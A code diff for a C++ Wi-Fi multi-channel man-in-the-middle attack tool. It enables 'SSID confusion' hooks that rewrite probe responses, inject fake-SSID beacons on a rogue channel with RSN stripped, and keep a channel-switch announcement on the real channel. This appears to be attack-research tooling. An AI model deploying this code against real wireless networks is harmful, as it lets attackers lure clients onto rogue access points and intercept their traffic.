@@ -1,4 +1,4 @@
-#include "attacks/mc_mitm/ssid_confusion_hooks.h"
+#include "../../../../include/attacks/mc_mitm/ssid_confusion/ssid_confusion_hooks.h"
 #include "attacks/mc_mitm/client_state.h"
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/wifi_util.h"
@@ -52,14 +52,11 @@ Dot11ProbeResponse make_confused_probe_resp(
 
 // change probe responses SSID
 void SsidConfusionHooks::on_probe_response(Dot11ProbeResponse &resp) {
-	//FIXME
-	//resp = make_confused_probe_resp(resp, confused_ssid_, strip_rsn_);
+	resp = make_confused_probe_resp(resp, confused_ssid_, strip_rsn_);
 }
 
-// add periodic beacon on rogue with fake SSID
+// inject confused beacon on rogue channel; return false to also send CSA on real channel
 bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
-	//FIXME
-	return false;
 	auto b = make_confused_beacon(*m.beacon, confused_ssid_, strip_rsn_);
 	m.send_to_rogue(b);
 	return false; // still send CSA switch beacon on real
@@ -67,7 +64,7 @@ bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
 
 bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11, HWAddress<6>) {
 	return false;
-	//FIXME
+	// ponytail: relay disabled until SAE on rogue is implemented
 	const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
 	if(!assoc) return false;
 
